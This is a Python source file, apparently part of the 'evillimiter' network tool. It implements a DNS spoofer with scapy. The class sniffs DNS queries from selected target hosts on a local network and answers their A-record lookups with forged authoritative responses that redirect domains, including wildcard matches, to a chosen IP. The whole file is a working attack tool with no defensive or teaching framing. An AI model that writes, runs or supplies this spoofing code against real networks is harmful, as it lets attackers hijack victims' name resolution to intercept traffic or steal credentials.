import threading
import platform
import socket
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sniff

from evillimiter.common.globals import BROADCAST


class DNSSpoofer(object):
    def __init__(self, interface, redirect_ip=None):
        self.interface = interface
        self.redirect_ip = redirect_ip  # Default redirect IP for all domains
        
        self._hosts = set()
        self._hosts_lock = threading.Lock()
        self._running = False
        self._thread = None
        
        # Domain-specific redirections: {host_ip: {domain: redirect_ip}}
        self._domain_mappings = {}
        self._mappings_lock = threading.Lock()
        
    def add(self, host):
        with self._hosts_lock:
            self._hosts.add(host)
            
    def remove(self, host):
        with self._hosts_lock:
            self._hosts.discard(host)
        with self._mappings_lock:
            self._domain_mappings.pop(host.ip, None)
            
    def set_domain_mapping(self, host_ip, domain_mappings):
        """
        Set domain-specific mappings for a host
        domain_mappings: dict of {domain: redirect_ip} or list of domains (use default redirect_ip)
        """
        with self._mappings_lock:
            if isinstance(domain_mappings, dict):
                self._domain_mappings[host_ip] = domain_mappings
            elif isinstance(domain_mappings, list):
                # If it's a list, use default redirect_ip for all domains
                self._domain_mappings[host_ip] = {domain: self.redirect_ip for domain in domain_mappings}
            
    def start(self):
        if not self._running:
            self._running = True
            self._thread = threading.Thread(target=self._sniff_dns, daemon=True)
            self._thread.start()
            
    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=2)
            
    def _resolve_domain(self, domain):
        """Resolve domain to IP address"""
        try:
            # Remove trailing dot if present
            domain = domain.rstrip('.')
            return socket.gethostbyname(domain)
        except:
            return None
            
    def _sniff_dns(self):
        """
        Sniffs DNS requests and responds with spoofed answers
        """
        def dns_filter(packet):
            return (packet.haslayer(DNS) and 
                    packet[DNS].qr == 0 and  # DNS query
                    packet[DNS].qd is not None)
                    
        while self._running:
            try:
                # Sniff DNS packets for a short interval
                # On macOS, don't specify interface for better compatibility
                if platform.system() == 'Darwin':
                    packets = sniff(filter="udp port 53", 
                                  prn=self._process_dns_packet,
                                  timeout=1,
                                  store=0)
                else:
                    packets = sniff(filter="udp port 53", 
                                  prn=self._process_dns_packet,
                                  timeout=1,
                                  iface=self.interface,
                                  store=0)
            except Exception as e:
                # Print error for debugging
                print(f"DNS sniff error: {e}")
                pass
                
    def _process_dns_packet(self, packet):
        """
        Process DNS query and send spoofed response if from targeted host
        """
        if not self._running:
            return
            
        # Check if packet is from one of our targeted hosts
        src_ip = packet[IP].src if packet.haslayer(IP) else None
        if not src_ip:
            return
            
        # Debug: print DNS packets we see
        print(f"DEBUG: DNS packet from {src_ip}")
            
        with self._hosts_lock:
            host_found = any(host.ip == src_ip for host in self._hosts)
            if not host_found:
                print(f"DEBUG: {src_ip} not in target hosts")
                return
            
        print(f"DEBUG: Processing DNS from target {src_ip}")
                
        # Only process DNS queries
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            # Extract query details
            query_name = packet[DNSQR].qname.decode() if packet[DNSQR].qname else ""
            query_type = packet[DNSQR].qtype
            
            # Only spoof A record queries (IPv4)
            if query_type == 1:
                # Determine redirect IP based on domain mappings
                redirect_ip = self.redirect_ip  # Default
                
                with self._mappings_lock:
                    if src_ip in self._domain_mappings:
                        # Check if we have specific mapping for this domain
                        for domain, ip in self._domain_mappings[src_ip].items():
                            # Match exact domain or wildcard
                            if query_name.rstrip('.') == domain.rstrip('.') or \
                               (domain.startswith('*.') and query_name.endswith(domain[2:])):
                                redirect_ip = ip
                                break
                
                # If no redirect IP is set, don't spoof
                if not redirect_ip:
                    return
                    
                # Create DNS response
                dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                               UDP(dport=packet[UDP].sport, sport=53) / \
                               DNS(id=packet[DNS].id,
                                   qr=1,  # Response
                                   aa=1,  # Authoritative answer
                                   qd=packet[DNS].qd,
                                   an=DNSRR(rrname=query_name,
                                           type='A',
                                           ttl=300,
                                           rdata=redirect_ip))
                
                # Send the spoofed response
                if platform.system() == 'Darwin':
                    import warnings
                    with warnings.catch_warnings():
                        warnings.simplefilter("ignore")
                        send(dns_response, verbose=0)
                else:
                    send(dns_response, verbose=0, iface=self.interface)